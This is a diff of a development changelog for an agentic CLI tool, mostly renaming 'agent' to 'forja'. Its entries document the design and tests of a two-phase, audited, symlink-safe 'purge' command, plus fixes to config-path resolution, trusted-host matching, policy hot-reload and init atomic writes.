 - **B1 — schema rename `*_removed` → `*_present`.** Initial design named the audit columns `bytes_removed`, `files_removed`, `dirs_removed`. But the audit row is written BEFORE the FS walker (load-bearing ordering), so the values are a PRE-purge snapshot, not an after-action report. A race where another process adds/removes files between snapshot and walker produces real-removal counts that diverge from the row. Renaming to `*_present` makes the snapshot semantics explicit and reflects what the row actually captures: "the operator-confirmed plan at confirmation time". The realized counts surface in `forceReport.removed` (stdout/JSON) but don't persist — log capture is the after-action evidence.
 - **B2 — walker push-after-stat ordering.** `paths.push(abs)` ran before `lstat` in both walk loops. If an entry vanished between `readdir` and `lstat` (concurrent process, race), `paths` would list it but totals wouldn't count it. The persisted `artifacts_present_json` would then mention paths that contributed zero to `bytes_present` — confusing forensic readers. Fix: push only after stat succeeds.
-- **D3 — drift-guard `INIT_MARKERS` ↔ `init.DEFAULT_STEPS`.** The two arrays live in different files (purge.ts and init.ts) without a structural link. A future init step (`hooks` for example) would scaffold a 5th artifact that purge wouldn't recognize as an init marker — projects scaffolded post-extension would refuse `agent purge`. New `tests/cli/purge.test.ts` drift-guard block uses an explicit `STEP_TO_MARKER` map (typed against the readonly `INIT_MARKERS` tuple so typos fail at compile time) + two paired assertions ("every step has a marker" + "every marker maps to a step"). Failure surfaces in CI, not in operator surprise.
-- **T1 — purge from a subdir resolves repoRoot.** Tests covered the canonical case (`cwd === repoRoot`) but never exercised `resolveRepoRoot` itself. New test `git init`s the tempdir, runs purge from `<repo>/src/`, verifies `<repo>/.agent/` (not `<repo>/src/.agent/`) is removed AND the audit row's `cwd` field carries the resolved repoRoot. Skips with a warning if `git` is unavailable (sandboxed CI) rather than mis-passing.
-- **T6 — walker/removeTree parity invariants.** The audit-row snapshot vs real-removal divergence (rationale for B1) needed a positive control: when nothing changes mid-purge, what's the expected relationship? New test asserts `files` and `bytes` match exactly between dry-run output and force-mode output; `dirs` differs by exactly 1 (removeTree counts `.agent/` root; walker does not). Catches future regressions where someone accidentally makes the walker include the root or the remove walker forget it.
+- **D3 — drift-guard `INIT_MARKERS` ↔ `init.DEFAULT_STEPS`.** The two arrays live in different files (purge.ts and init.ts) without a structural link. A future init step (`hooks` for example) would scaffold a 5th artifact that purge wouldn't recognize as an init marker — projects scaffolded post-extension would refuse `forja purge`. New `tests/cli/purge.test.ts` drift-guard block uses an explicit `STEP_TO_MARKER` map (typed against the readonly `INIT_MARKERS` tuple so typos fail at compile time) + two paired assertions ("every step has a marker" + "every marker maps to a step"). Failure surfaces in CI, not in operator surprise.
+- **T1 — purge from a subdir resolves repoRoot.** Tests covered the canonical case (`cwd === repoRoot`) but never exercised `resolveRepoRoot` itself. New test `git init`s the tempdir, runs purge from `<repo>/src/`, verifies `<repo>/.forja/` (not `<repo>/src/.forja/`) is removed AND the audit row's `cwd` field carries the resolved repoRoot. Skips with a warning if `git` is unavailable (sandboxed CI) rather than mis-passing.
+- **T6 — walker/removeTree parity invariants.** The audit-row snapshot vs real-removal divergence (rationale for B1) needed a positive control: when nothing changes mid-purge, what's the expected relationship? New test asserts `files` and `bytes` match exactly between dry-run output and force-mode output; `dirs` differs by exactly 1 (removeTree counts `.forja/` root; walker does not). Catches future regressions where someone accidentally makes the walker include the root or the remove walker forget it.
 
 The self-review also surfaced lower-priority items deferred for follow-up: JSON shape divergence between dry-run and force-mode (D1), canonical-JSON-vs-stable-sorted-JSON wording (D2), PRESERVED_PATHS using literal `~/...` instead of resolved paths (D4), `--no-audit` silently ignored in dry-run (D6). Documented in the BACKLOG follow-up notes; tracked but not blocking.
 
-**Outcome.** New top-level verb `agent purge [--force] [--json] [--no-audit]` resets a Forja-initialized project to "as if it never ran here" from the filesystem perspective. Dry-run (bare invocation) prints scope + per-category sizes + preserved-state list + audit writability + the literal `agent purge --force` command to execute. `--force` writes one append-only `purge_events` row to the global DB, then walks `<repoRoot>/.agent/` with `lstat` (never following symlinks) and removes everything. The global DB and `~/.config/agent/**` are untouched by design — sessions / approvals_log / memory_events for the cwd remain queryable via `agent --list-sessions --project <cwd>` after the purge.
+**Outcome.** New top-level verb `forja purge [--force] [--json] [--no-audit]` resets a Forja-initialized project to "as if it never ran here" from the filesystem perspective. Dry-run (bare invocation) prints scope + per-category sizes + preserved-state list + audit writability + the literal `forja purge --force` command to execute. `--force` writes one append-only `purge_events` row to the global DB, then walks `<repoRoot>/.forja/` with `lstat` (never following symlinks) and removes everything. The global DB and `~/.config/forja/**` are untouched by design — sessions / approvals_log / memory_events for the cwd remain queryable via `forja --list-sessions --project <cwd>` after the purge.
 
 **Operator-visible end-to-end** (smoke against a fixture):
 
 ```
-$ agent purge
+$ forja purge
 forja purge — DRY RUN (nothing will be modified)
 Project root: /tmp/forja-purge-smoke
-Scope:        /tmp/forja-purge-smoke/.agent/
+Scope:        /tmp/forja-purge-smoke/.forja/
 Will remove:
-  /tmp/forja-purge-smoke/.agent/.gitignore         12 B   [operator-owned — confirm before --force]
-  /tmp/forja-purge-smoke/.agent/agents/            1 files, 9 B
-  /tmp/forja-purge-smoke/.agent/bg/                1 files, 4 B
-  /tmp/forja-purge-smoke/.agent/config.toml        9 B
-  /tmp/forja-purge-smoke/.agent/memory/            1 files, 7 B
-  /tmp/forja-purge-smoke/.agent/permissions.yaml   11 B
+  /tmp/forja-purge-smoke/.forja/.gitignore         12 B   [operator-owned — confirm before --force]
+  /tmp/forja-purge-smoke/.forja/playbooks/            1 files, 9 B
+  /tmp/forja-purge-smoke/.forja/bg/                1 files, 4 B
+  /tmp/forja-purge-smoke/.forja/config.toml        9 B
+  /tmp/forja-purge-smoke/.forja/memory/            1 files, 7 B
+  /tmp/forja-purge-smoke/.forja/permissions.yaml   11 B
 Total: 6 files, 4 directories, 52 B
 Preserved (will NOT be touched):
   ~/.local/share/forja/sessions.db    (global DB; sessions for this cwd remain queryable)
-  ~/.config/agent/**                  (user-layer config + memory)
+  ~/.config/forja/**                  (user-layer config + memory)
   ~/.local/share/forja/install_id     (install identity; audit chain genesis)
 Audit will be recorded in purge_events at: /home/lex/.local/share/forja/sessions.db
 To execute:
-  agent purge --force
+  forja purge --force
 ```
 
 **Decisions that survived in-flight review:**
 
-- **Filesystem-only scope is load-bearing.** Considered + rejected: a parallel sweep of the global DB by cwd. Rationale: cross-substrate FK tracking would be load-bearing forever; the audit-chain rows for this project are exactly the "manter audit" intent the operator confirmed; stale references (DB rows naming a purged `.agent/`) are inert (memory loader reads `.md` files, not memory_events; trust-corpus rows trigger re-prompt on next session — desired). Documented as out-of-scope in `AGENTIC_CLI.md §2.1.2`.
-- **Init marker is permissive (any one of four).** Catches "purge in $HOME by accident" and "purge against a foreign .agent/ planted by another tool" without surprising operators who manually pruned three of the four. Markers list (`permissions.yaml`, `.gitignore`, `config.toml`, `agents/`) is the same set the init orchestrator writes. Failure message names the four explicitly so the operator can debug without grepping source.
+- **Filesystem-only scope is load-bearing.** Considered + rejected: a parallel sweep of the global DB by cwd. Rationale: cross-substrate FK tracking would be load-bearing forever; the audit-chain rows for this project are exactly the "manter audit" intent the operator confirmed; stale references (DB rows naming a purged `.forja/`) are inert (memory loader reads `.md` files, not memory_events; trust-corpus rows trigger re-prompt on next session — desired). Documented as out-of-scope in `AGENTIC_CLI.md §2.1.2`.
+- **Init marker is permissive (any one of four).** Catches "purge in $HOME by accident" and "purge against a foreign .forja/ planted by another tool" without surprising operators who manually pruned three of the four. Markers list (`permissions.yaml`, `.gitignore`, `config.toml`, `agents/`) is the same set the init orchestrator writes. Failure message names the four explicitly so the operator can debug without grepping source.
 - **`.gitignore` is purged with the rest, but flagged in the dry-run.** Operator-owned semantics from `MEMORY.md §2.5` protect against `init --force` clobbering hand edits, not against the operator's explicit reset verb. Dry-run renders `[operator-owned — confirm before --force]` alongside the size so a deliberate edit doesn't disappear silently.
 - **Audit row before any FS mutation.** `--force` opens + migrates the DB, computes the install identity (`ensureInstallId`), and inserts the `purge_events` row BEFORE entering the removal walker. If the DB is unwriteable, `--force` aborts (`cannot write audit row to DB`) unless `--no-audit` is explicit. `--no-audit` is the escape hatch for emergencies (compromised host, corrupted DB) — purge proceeds without leaving a forensic row; stderr warns explicitly so CI logs capture the bypass.
-- **Symlink defense is `lstat`-only, top-down.** `lstat` on `<repoRoot>/.agent/` itself refuses if it's a link (operator's choice to share state from elsewhere is respected). Inside the walker, `lstat` per entry: symlink entries are `unlinkSync`'d (the link, not the target) and never recursed into. Tested directly with a `--force` that leaves an external symlink target intact post-purge.
+- **Symlink defense is `lstat`-only, top-down.** `lstat` on `<repoRoot>/.forja/` itself refuses if it's a link (operator's choice to share state from elsewhere is respected). Inside the walker, `lstat` per entry: symlink entries are `unlinkSync`'d (the link, not the target) and never recursed into. Tested directly with a `--force` that leaves an external symlink target intact post-purge.
 - **No hash chain on `purge_events`.** Considered + rejected. Purge is an operational event, not a policy decision with replay semantics; a chain would complicate the schema for no concrete threat-model gain. `approvals_log` keeps its chain (decisions are replayable); `purge_events` lives parallel as a lightweight install-scoped reset log.
 - **Dedicated table over reusing `approvals_log` / `failure_events`.** approvals_log requires a `session_id` (purge fires outside any session); failure_events is semantic-mismatched (purge is a successful operator action). Dedicated `purge_events` mirrors the established pattern (memory_events, hook_runs, eviction_events, outcomes — one concern per table, append-only).
 
@@ -7129,14 +8433,14 @@ To execute:
 - DB cleanup by cwd. Privacy-purge / GDPR flow is a separate `SECURITY_GUIDELINE.md` concern; this verb does not impersonate it.
 - Backup before purge. Two-phase confirmation already lets the operator inspect output and copy what matters; FS-noisy tar.gz dropouts create a new "where does it live, who cleans it?" surface for no clear win.
 - Slash `/purge`. Verb is setup-adjacent (mutually exclusive with active session — it purges the bootstrap the session reads from). Same posture as `init`, `doctor`, `welcome`.
-- `agent purge log` reader. `listPurgeEventsByCwd` ships with the repo so a future slice can wire it to a verb; no concrete consumer asked for the verb today.
+- `forja purge log` reader. `listPurgeEventsByCwd` ships with the repo so a future slice can wire it to a verb; no concrete consumer asked for the verb today.
 
 **Edge cases pinned by tests:**
 
-- Symlink target outside `.agent/` survives a purge that crosses the link.
+- Symlink target outside `.forja/` survives a purge that crosses the link.
 - Purge then re-init then purge again — both rows land in `purge_events` for the same cwd; install_id stable across both (genesis preserved).
 - DB unwriteable + `--no-audit` set: FS removal happens, stderr warns, audit skipped. Without `--no-audit`: FS untouched, exit 1.
-- Empty `.agent/` (only marker is a 0-byte `.gitignore`): handled correctly (1 file, 0 bytes).
+- Empty `.forja/` (only marker is a 0-byte `.gitignore`): handled correctly (1 file, 0 bytes).
 - Walker sorts paths into the canonical JSON for `artifacts_present_json` so two enumerations of the same tree produce byte-stable rows (forensic comparability).
 
 **Spec edits** (`docs/spec/`):
@@ -7163,42 +8467,42 @@ To execute:
 
 46 new tests pass; typecheck + lint clean across the 920-file Biome scan. Tests of the files I touched (`tests/cli/args.test.ts`, `tests/cli/init.test.ts`, `tests/cli/index.test.ts`, `tests/cli/doctor.test.ts`, `tests/cli/welcome.test.ts`, `tests/storage/db.test.ts`, `tests/storage/migrate.test.ts`) — 280 tests, 0 fail.
 
-**Production-readiness shift.** Before: an operator evaluating Forja on a project and wanting to back out had only `rm -rf .agent/` — no audit, no symlink defense, no marker check, full apex risk (`rm -rf` typo destroys parent tree; symlinked `.agent/` obliterates shared state). After: `agent purge` is first-class, two-phase, audited, symlink-safe, marker-gated, and idempotent with `agent init` (re-init after purge re-scaffolds cleanly because init is pure-FS and the DB is preserved). The "what survives in the global DB" contract is in the spec and surfaced in every dry-run.
+**Production-readiness shift.** Before: an operator evaluating Forja on a project and wanting to back out had only `rm -rf .forja/` — no audit, no symlink defense, no marker check, full apex risk (`rm -rf` typo destroys parent tree; symlinked `.forja/` obliterates shared state). After: `forja purge` is first-class, two-phase, audited, symlink-safe, marker-gated, and idempotent with `forja init` (re-init after purge re-scaffolds cleanly because init is pure-FS and the DB is preserved). The "what survives in the global DB" contract is in the spec and surfaced in every dry-run.
 
-## [2026-05-19] feat(cli) — `agent purge` project-scope reset (pre-work plan)
+## [2026-05-19] feat(cli) — `forja purge` project-scope reset (pre-work plan)
 
-A first-time operator who wants to evaluate Forja on a project, then back out — or who wants to restart with clean state after a botched session — has no first-class undo. `agent init` creates `<repoRoot>/.agent/` with permissions, config, gitignore, and 10 canonical playbooks; subsequent sessions accumulate memory (`memory/{shared,local}/`), background-process logs (`bg/`), and operator-edited artifacts. There is no `agent <verb>` that takes a project-initialized directory and returns it to "as if Forja never ran here". Operators today have to `rm -rf .agent/` manually, which leaves no audit trace and exposes them to apex risk (`rm -rf` typo destroys parent tree; following a symlink obliterates `~`-shared corpus).
+A first-time operator who wants to evaluate Forja on a project, then back out — or who wants to restart with clean state after a botched session — has no first-class undo. `forja init` creates `<repoRoot>/.forja/` with permissions, config, gitignore, and 10 canonical playbooks; subsequent sessions accumulate memory (`memory/{shared,local}/`), background-process logs (`bg/`), and operator-edited artifacts. There is no `agent <verb>` that takes a project-initialized directory and returns it to "as if Forja never ran here". Operators today have to `rm -rf .forja/` manually, which leaves no audit trace and exposes them to apex risk (`rm -rf` typo destroys parent tree; following a symlink obliterates `~`-shared corpus).
 
-This slice adds `agent purge` — operator-fired, two-phase (dry-run then `--force`), filesystem-scoped to `<repoRoot>/.agent/`, audited via a new append-only `purge_events` table on the global DB. The dry-run shows what will be removed plus the literal command to execute. `--force` writes the audit row first, then walks the tree with `lstat` (refuses to follow symlinks out of the purge root). DB-global state is preserved by design: sessions, approvals_log, memory_events for this cwd remain queryable forever via `agent --list-sessions --project <cwd>` — the user's "talvez manter audit" intuition translates to "filesystem-only purge, DB untouched, audit-chain integrity preserved naturally".
+This slice adds `forja purge` — operator-fired, two-phase (dry-run then `--force`), filesystem-scoped to `<repoRoot>/.forja/`, audited via a new append-only `purge_events` table on the global DB. The dry-run shows what will be removed plus the literal command to execute. `--force` writes the audit row first, then walks the tree with `lstat` (refuses to follow symlinks out of the purge root). DB-global state is preserved by design: sessions, approvals_log, memory_events for this cwd remain queryable forever via `forja --list-sessions --project <cwd>` — the user's "talvez manter audit" intuition translates to "filesystem-only purge, DB untouched, audit-chain integrity preserved naturally".
 
 **Scope (decisions confirmed up front):**
 
-- **Filesystem-only.** Purge restricted to `<repoRoot>/.agent/`. The global `sessions.db` and `~/.config/agent/**` are never touched — every audit chain row referencing this cwd survives. Alternative considered (sweep DB by cwd) rejected: cross-substrate FK tracking would be load-bearing forever and would erase exactly the audit the user said to keep.
-- **Init marker required.** Refuse unless `<repoRoot>/.agent/` exists AND contains at least one of the 4 init-canonical artifacts (`permissions.yaml`, `config.toml`, `agents/`, `.gitignore`). Catches "operator typed `agent purge` in $HOME by accident" and "operator opened a project not initialized by Forja". Permissive enough to recover from a partial init (operator who deleted `permissions.yaml` manually but still has the rest).
+- **Filesystem-only.** Purge restricted to `<repoRoot>/.forja/`. The global `sessions.db` and `~/.config/forja/**` are never touched — every audit chain row referencing this cwd survives. Alternative considered (sweep DB by cwd) rejected: cross-substrate FK tracking would be load-bearing forever and would erase exactly the audit the user said to keep.
+- **Init marker required.** Refuse unless `<repoRoot>/.forja/` exists AND contains at least one of the 4 init-canonical artifacts (`permissions.yaml`, `config.toml`, `agents/`, `.gitignore`). Catches "operator typed `forja purge` in $HOME by accident" and "operator opened a project not initialized by Forja". Permissive enough to recover from a partial init (operator who deleted `permissions.yaml` manually but still has the rest).
 - **`.gitignore` deleted with the rest.** Operator-owned semantics from `MEMORY.md §2.5` exist to protect against `init --force` clobbering hand edits, not against explicit operator-fired purge. Dry-run output flags it with a warning line so the operator confirms.
 - **Append-only audit row before any FS mutation.** New `purge_events` table (`id, ts, install_id, cwd, artifacts_present_json, bytes_removed, files_removed, dirs_removed, forja_version`). DB inaccessibility aborts `--force` unless `--no-audit` is explicit; dry-run downgrades to a warning.
-- **Symlink defense.** `lstat` on `<repoRoot>/.agent/` BEFORE entering it — if it's a symlink, refuse and instruct the operator to `rm` the link manually (we will not follow). Inside the walker, `lstat` every entry; for symlink entries, unlink the link itself without traversing.
+- **Symlink defense.** `lstat` on `<repoRoot>/.forja/` BEFORE entering it — if it's a symlink, refuse and instruct the operator to `rm` the link manually (we will not follow). Inside the walker, `lstat` every entry; for symlink entries, unlink the link itself without traversing.
 
 **Phase 0 — Spec PR (mandatory first per CLAUDE.md hard rule).**
 
 - `AGENTIC_CLI.md §2.1` — add `Purge` row to the modes table.
-- `AGENTIC_CLI.md §2.1.2` (new subsection) — scope, init-marker gate, dry-run vs `--force`, audit row contract, symlink defense, "what survives in the global DB" explainer (`agent --list-sessions --project <cwd>` after purge).
+- `AGENTIC_CLI.md §2.1.2` (new subsection) — scope, init-marker gate, dry-run vs `--force`, audit row contract, symlink defense, "what survives in the global DB" explainer (`forja --list-sessions --project <cwd>` after purge).
 - `AUDIT.md §1` — add `purge_events` row to the canonical 28-table list with retention 365d, low sensitivity, no redaction.
 
 **Phase 1 — Storage layer.**
 
 - `src/storage/migrations/066-purge-events.ts` — `CREATE TABLE purge_events (id INTEGER PRIMARY KEY AUTOINCREMENT, ts INTEGER NOT NULL CHECK > 0, install_id TEXT NOT NULL, cwd TEXT NOT NULL, artifacts_present_json TEXT NOT NULL, bytes_present INTEGER NOT NULL CHECK >= 0, files_present INTEGER NOT NULL CHECK >= 0, dirs_present INTEGER NOT NULL CHECK >= 0, forja_version TEXT NOT NULL)` + `(cwd, ts)` index for cwd-scoped queries. Append-only by convention; no UPDATE/DELETE in repo. Note: columns are `*_present` (snapshot pré-purge), not `*_removed`, since the audit row is written before the FS walker — see post-work entry for the load-bearing rationale.
-- `src/storage/repos/purge-events.ts` — `insertPurgeEvent(db, row)` returning the assigned id; `listPurgeEventsByCwd(db, cwd, limit?)` for forensic / future `agent purge log` slice.
+- `src/storage/repos/purge-events.ts` — `insertPurgeEvent(db, row)` returning the assigned id; `listPurgeEventsByCwd(db, cwd, limit?)` for forensic / future `forja purge log` slice.
 
 **Phase 2 — CLI parser.** `src/cli/args.ts` — `parsePurgeSubcommand` matching the `init`/`doctor` shape (subcommand verb stops prompt collection). Flags: `--force` (execute), `--json` (NDJSON output for both modes), `--no-audit` (allow `--force` even if DB unwriteable; documented as escape hatch for emergencies). Mutually exclusive with all other verbs. Update `parseArgs` dispatch sequence.
 
 **Phase 3 — Handler.** `src/cli/purge.ts:runPurge` —
 1. Resolve `repoRoot` via `resolveRepoRoot(cwd)` (memory/paths.ts).
-2. `lstat` `<repoRoot>/.agent/`; refuse if symlink or missing.
+2. `lstat` `<repoRoot>/.forja/`; refuse if symlink or missing.
 3. Check init marker (any of the 4 canonical artifacts present).
-4. Walk `.agent/` with `lstat` per entry; collect paths + bytes + counts; never follow symlinks out.
+4. Walk `.forja/` with `lstat` per entry; collect paths + bytes + counts; never follow symlinks out.
 5. Open + migrate DB; check writability. Dry-run: print warning if unwriteable. `--force`: abort unless `--no-audit`.
-6. If `!force`: print info block, scope (grouped by category), explicit `.gitignore` warning, literal `agent purge --force` command, exit 0.
+6. If `!force`: print info block, scope (grouped by category), explicit `.gitignore` warning, literal `forja purge --force` command, exit 0.
 7. If `force`: write audit row → atomic-ish FS removal (rm -rf semantics but symlink-safe) → summary line. Exit 0.
 
 **Phase 4 — Dispatcher.** `src/cli/index.ts` — lazy-import branch for `args.purge`. Add to `inSetupFlow` exemption (first-boot nudge suppressed) and to `promptOptional` predicate.
@@ -7210,7 +8514,7 @@ This slice adds `agent purge` — operator-fired, two-phase (dry-run then `--for
 - **DB cleanup by cwd.** Would require tracking every table that joins via `cwd` or via FK to `sessions(cwd=)` — load-bearing forever. The user explicitly said "manter audit"; deferred indefinitely until a concrete compliance ask names a row that must disappear.
 - **Backup before purge.** Operator with two-phase confirmation already has the chance to inspect output and copy what they want. Adding tar-gzball to a temp dir is FS-noisy and creates another surface (where does the backup live? who cleans it up?). Skip for v1.
 - **Slash `/purge`.** Purge is a setup-adjacent verb (mutually exclusive with an active session — purges the project bootstrap that the running session reads from). No slash counterpart; same posture as `init`, `doctor`, `welcome`.
-- **`agent purge log` reader.** `listPurgeEventsByCwd` ships with the repo so a future slice can wire it to a verb; doesn't ship as a verb today (no concrete consumer requested it).
+- **`forja purge log` reader.** `listPurgeEventsByCwd` ships with the repo so a future slice can wire it to a verb; doesn't ship as a verb today (no concrete consumer requested it).
 
 Post-work entry will follow once code + tests land. Single branch `feat/purge-command`; spec commits first, code commits after — per-subsystem branch strategy.
 
@@ -7224,14 +8528,14 @@ Audit of `src/*/paths.ts` files revealed the XDG / HOME / Windows APPDATA / PROG
 | `hooks/paths.ts` | ✓ | ✓ | ✗ | ✗ | ✓ | ✓ |
 | `config/paths.ts` (my recent refactor) | ✓ | ✓ | ✗ | ✗ | n/a | n/a |
 
-**Latent bug.** Operator on Windows running `agent` without `XDG_CONFIG_HOME` set: hooks and config.toml user layers were silently unavailable. The implementation returned `null`, the loader treated it as "no user file", and the operator's `~/.config/agent/{hooks.toml,config.toml}` (or platform equivalent) was silently ignored. Only the permissions layer worked correctly because that's the file the lock-conflict story made the team test most thoroughly.
+**Latent bug.** Operator on Windows running `forja` without `XDG_CONFIG_HOME` set: hooks and config.toml user layers were silently unavailable. The implementation returned `null`, the loader treated it as "no user file", and the operator's `~/.config/forja/{hooks.toml,config.toml}` (or platform equivalent) was silently ignored. Only the permissions layer worked correctly because that's the file the lock-conflict story made the team test most thoroughly.
 
 **Consolidation.** New `src/config/agent-paths.ts` owns the shared logic with the most complete (permissions-shape) implementation:
 
 - `agentConfigDir(env?, platform?): string | null` — XDG → Windows APPDATA → Windows USERPROFILE → POSIX HOME → null.
 - `userAgentPath(filename, env?, platform?): string | null` — `agentConfigDir + filename`.
-- `enterpriseAgentPath(filename, env?, platform?): string | null` — `/etc/agent/<filename>` (POSIX) or `<PROGRAMDATA>\agent\<filename>` (Windows), null when env missing.
-- `projectAgentPath(repoRoot, filename, platform?): string` — platform-aware `join(repoRoot, '.agent', filename)`.
+- `enterpriseAgentPath(filename, env?, platform?): string | null` — `/etc/forja/<filename>` (POSIX) or `<PROGRAMDATA>\forja\<filename>` (Windows), null when env missing.
+- `projectAgentPath(repoRoot, filename, platform?): string` — platform-aware `join(repoRoot, '.forja', filename)`.
 
 Each subsystem's public API stays identical:
 
@@ -7239,7 +8543,7 @@ Each subsystem's public API stays identical:
 - `hooks/paths.ts` keeps `enterpriseHooksPath` / `userHooksPath` / `projectHooksPath` / `resolveHookPaths` — delegates with `hooks.toml`.
 - `config/paths.ts` keeps `userConfigPath` / `projectConfigPath` — delegates with `config.toml`. **This commit closes the Windows gap as a side effect** (operator on Windows now gets the user-layer config.toml resolved correctly).
 
-**Tests.** All 84 existing per-subsystem path tests pass unchanged — behavior is preserved (delegation is mechanical). New `tests/config/agent-paths.test.ts` adds 16 cases pinning the shared module directly: XDG precedence, non-absolute XDG rejection (traversal defense), POSIX fallback, **Windows APPDATA / USERPROFILE behavior** (catches regression to the POSIX-only shape that hooks and config.toml had), Windows `null` on stripped env, enterprise POSIX `/etc/agent/`, enterprise Windows PROGRAMDATA, project-path platform-aware join.
+**Tests.** All 84 existing per-subsystem path tests pass unchanged — behavior is preserved (delegation is mechanical). New `tests/config/agent-paths.test.ts` adds 16 cases pinning the shared module directly: XDG precedence, non-absolute XDG rejection (traversal defense), POSIX fallback, **Windows APPDATA / USERPROFILE behavior** (catches regression to the POSIX-only shape that hooks and config.toml had), Windows `null` on stripped env, enterprise POSIX `/etc/forja/`, enterprise Windows PROGRAMDATA, project-path platform-aware join.
 
 What this refactor did NOT touch (deliberately):
 
@@ -7250,7 +8554,7 @@ Suite delta: 100 path tests pass across the 4 affected files (84 existing + 16 n
 
 ## [2026-05-19] fix(permissions) — honor host globs in `trusted_hosts`
 
-`risk-score.ts:isUntrustedEgressHost` was checking trust with `trusted.includes(host)` — exact string match — while the sibling `allow_hosts` / `deny_hosts` lists on the SAME `fetch_url` schema use `matcher.ts:matchHost` which honors `*.corp.internal` style patterns. Operator declaring `trusted_hosts: ["*.corp.internal"]` in `.agent/permissions.yaml` saw `foo.corp.internal` continue triggering the `untrusted_egress` risk component despite the policy explicitly trusting the entire `*.corp.internal` subdomain space. Operator-visible divergence within a single policy section.
+`risk-score.ts:isUntrustedEgressHost` was checking trust with `trusted.includes(host)` — exact string match — while the sibling `allow_hosts` / `deny_hosts` lists on the SAME `fetch_url` schema use `matcher.ts:matchHost` which honors `*.corp.internal` style patterns. Operator declaring `trusted_hosts: ["*.corp.internal"]` in `.forja/permissions.yaml` saw `foo.corp.internal` continue triggering the `untrusted_egress` risk component despite the policy explicitly trusting the entire `*.corp.internal` subdomain space. Operator-visible divergence within a single policy section.
 
 Fix: replace `trusted.includes(host)` with `for (const pattern of trusted) if (matchHost(pattern, host)) return false` — reuse the existing host matcher. Exact strings still match exactly (`github.com` → `github.com`); globs now match consistently with the rest of the section.
 
@@ -7269,7 +8573,7 @@ Considered the alternative (reject patterns in `trusted_hosts` as unsupported wi
 
 ## [2026-05-19] fix(permissions) — recompute trustedHosts on policy hot-reload
 
-`engine.ts:1277` captured `trustedHosts` as a closure-const at engine construction. `reloadPolicy` was swapping policy / policyHash / mode / provenance correctly, but the risk-score input kept using the construction-time list. Operator edits to `<repo>/.agent/permissions.yaml` adding an internal CDN to `fetch_url.trusted_hosts` (or removing a no-longer-trusted host) saw the policy hash advance, `source.layer` updated, audit row reflected the swap — but `untrusted_egress` continued firing (or failing to fire) against the OLD set until process restart. `config != runtime` divergence on the hot-reload path.
+`engine.ts:1277` captured `trustedHosts` as a closure-const at engine construction. `reloadPolicy` was swapping policy / policyHash / mode / provenance correctly, but the risk-score input kept using the construction-time list. Operator edits to `<repo>/.forja/permissions.yaml` adding an internal CDN to `fetch_url.trusted_hosts` (or removing a no-longer-trusted host) saw the policy hash advance, `source.layer` updated, audit row reflected the swap — but `untrusted_egress` continued firing (or failing to fire) against the OLD set until process restart. `config != runtime` divergence on the hot-reload path.
 
 **Fix shape — minimum-invasive:**
 
@@ -7313,7 +8617,7 @@ Net: 3 new tests (defense), 1 spec table-row clarification. No code changes — 
 
 ## [2026-05-19] fix(config) — `[budget].max_step_stall_ms = 0` accepted (matches runtime opt-out)
 
-`BUDGET_INT_KEYS` in `src/critique/config-loader.ts` had `min: 1` for `max_step_stall_ms`. The runtime contract (`src/harness/abortable.ts:38, :68`) explicitly uses `stallMs <= 0` as the "disable per-step watchdog" sentinel — `stallWatchdog` yields the source verbatim with no timer. An operator running long steady-streaming provider calls who set `max_step_stall_ms = 0` in `.agent/config.toml` to opt out got a "out of range [1, 3600000]" warning and the default 90s watchdog silently stayed in effect. The validator forbade what the harness supports — `config !== runtime` divergence.
+`BUDGET_INT_KEYS` in `src/critique/config-loader.ts` had `min: 1` for `max_step_stall_ms`. The runtime contract (`src/harness/abortable.ts:38, :68`) explicitly uses `stallMs <= 0` as the "disable per-step watchdog" sentinel — `stallWatchdog` yields the source verbatim with no timer. An operator running long steady-streaming provider calls who set `max_step_stall_ms = 0` in `.forja/config.toml` to opt out got a "out of range [1, 3600000]" warning and the default 90s watchdog silently stayed in effect. The validator forbade what the harness supports — `config !== runtime` divergence.
 
 Fix: `min: 0` for `max_step_stall_ms` only. `max_steps` and `max_wall_clock_ms` keep `min: 1` because `0` for those means "abort immediately" (no documented disable semantic) — guarding against a footgun where the operator types `0` expecting "no limit".
 
@@ -7321,20 +8625,20 @@ Inline comment in `BUDGET_INT_KEYS` rewritten to spell out the per-key disable s
 
 ## [2026-05-19] hardening(cli) — three init robustness follow-ups (atomic writes, mid-loop pin, eval)
 
-Self-review of `agent init` after the rich-scaffold landed surfaced three production-readiness gaps. All three closed here on the same branch.
+Self-review of `forja init` after the rich-scaffold landed surfaced three production-readiness gaps. All three closed here on the same branch.
 
 **1. Atomic temp+rename for the three non-gitignore writers.** `scaffoldPermissions`, `scaffoldConfig`, `scaffoldPlaybooks` were calling bare `writeFileSync`. A process killed mid-write leaves a partial target file — `permissions.yaml` truncated at byte 500 refuses parse on next boot (engine → refusing), `config.toml` partial fails TOML.parse (loader fail-soft warns, defaults kick in — silent semantic drift), playbook `.md` truncated breaks the subagent loader on read.
 
 The gitignore writer was already atomic via `ensureAgentGitignore` (`wx` create-or-fail flag). New `atomicWrite(target, content)` helper in `init.ts` mirrors the temp+rename idiom from `cli/slash/commands/memory.ts:3268-3271` (`mutateMemoryConfig`): write `<target>.tmp-<pid>-<ts>` first, then `renameSync` into place. The rename is a single filesystem syscall, atomic on POSIX/NTFS for same-volume renames. On write or rename failure, best-effort `unlinkSync(tmp)` cleans up the temp before re-raising; inner unlink errors are swallowed so the operator's diagnostic surfaces the original write failure, not a secondary unlink-of-nonexistent.
 
-**2. Mid-loop failure pin for `scaffoldPlaybooks`.** Prior test coverage exercised the step-boundary failure (sentinel file at `.agent/agents` → mkdirSync ENOTDIR) but not within-loop. Inject scenario added: fixture with four entries where entry 3's `filename` points at a non-existent subdir (`missing-subdir/bad.md`). writeFileSync fails with ENOENT; the scaffolder early-returns. Pins assert: entries 1+2 wrote to final paths, entry 3 has no file (atomicWrite cleaned up its temp on write-throw), entry 4 was never attempted, stderr carries the diagnostic, no `.tmp-PID-TS` orphans linger anywhere in `.agent/agents/`. A refactor that loses the early-return (continuing past a single write failure) would silently turn this into "entries 1+2+4 wrote, error printed for 3" — caught here.
